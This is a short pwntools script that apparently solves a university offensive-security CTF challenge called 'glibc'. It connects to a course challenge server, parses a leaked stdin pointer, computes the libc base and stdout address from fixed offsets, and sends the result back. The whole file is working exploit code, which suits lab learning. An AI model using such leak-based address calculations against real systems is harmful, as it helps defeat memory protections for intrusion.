
from pwn import *

#context.log_level = "DEBUG"

CHALLENGE = "glibc"
PORT = 1236
NETID = b"os2178"
LOCAL = False

if LOCAL:
	p = process(CHALLENGE)
else:
	p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", PORT)
	p.recvuntil(b"NetID (something like abc123): ")
	p.sendline(NETID)

#hex values for offset of stdio
stdinOffset = "0x21aaa0"
stdoutOffset = "0x21b780"

#get stdin address
print(p.recvuntil(b"note: "))

stdinAddress = p.recvuntil(b"\n").strip(b"\n")

#reverse for lsb
stdinAddress = stdinAddress[::-1]

#convert to hex
stdinAddress = "0x" + stdinAddress.hex()
print(stdinAddress)

#find base address
baseAddress = hex(int(stdinAddress, 16) - int(stdinOffset, 16))

#find stdout address
stdoutAddress = hex(int(baseAddress, 16) + int(stdoutOffset, 16))

#convert to raw bytes
stdoutAddress = stdoutAddress[2:]
stdoutAddress = "0000" + stdoutAddress
stdoutAddress = bytes.fromhex(stdoutAddress)
stdoutAddress = stdoutAddress[::-1]
print(stdoutAddress)

print(p.recvuntil(b"> "))
p.sendline(stdoutAddress)

p.interactive()
